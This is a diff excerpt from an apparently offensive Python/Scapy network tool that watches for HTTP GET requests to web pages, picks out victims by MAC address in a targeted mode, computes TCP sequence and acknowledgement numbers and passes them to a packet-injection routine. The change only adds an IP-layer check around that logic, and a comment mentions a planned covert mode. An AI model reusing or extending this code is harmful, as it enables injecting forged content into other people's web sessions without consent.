@@ -281,27 +281,28 @@ def http_header(packet):
 
 	#TODO: Improve this check and implement --covert mode with stricter checks
         if (http_packet.find('GET') and (getarg.find("php") or getarg.find("asp") or getarg.find("htm") or getarg.find("html")) ):
-		process=0
-		if (TARGETED):
-			for m_mac in mac_list:
-				if (packet.getlayer(Ether).src.lower()==m_mac.lower()):
-					process=1
-		else:
-			process=1
-		if (process==1):
-			vicmac=packet.getlayer(Ether).src
-			rtrmac=packet.getlayer(Ether).dst
-			vicip=packet.getlayer(IP).src
-			svrip=packet.getlayer(IP).dst
-			vicport=packet.getlayer(TCP).sport
-			svrport=packet.getlayer(TCP).dport
-			try:
-				size=len(packet.getlayer(TCP).load)
-			except:
-				size=20
-			acknum=str(int(packet.getlayer(TCP).seq)+size)
-			seqnum=packet.getlayer(TCP).ack
-			start_injection(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum)
+		if (packet.haslayer(IP)):
+			process=0
+			if (TARGETED):
+				for m_mac in mac_list:
+					if (packet.getlayer(Ether).src.lower()==m_mac.lower()):
+						process=1
+			else:
+				process=1
+			if (process==1):
+				vicmac=packet.getlayer(Ether).src
+				rtrmac=packet.getlayer(Ether).dst
+				vicip=packet.getlayer(IP).src
+				svrip=packet.getlayer(IP).dst
+				vicport=packet.getlayer(TCP).sport
+				svrport=packet.getlayer(TCP).dport
+				try:
+					size=len(packet.getlayer(TCP).load)
+				except:
+					size=20
+				acknum=str(int(packet.getlayer(TCP).seq)+size)
+				seqnum=packet.getlayer(TCP).ack
+				start_injection(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum)
 
 #
 # Packet injection for targeted mode, only injects if the MAC address is present in mac_list, as defined by -t
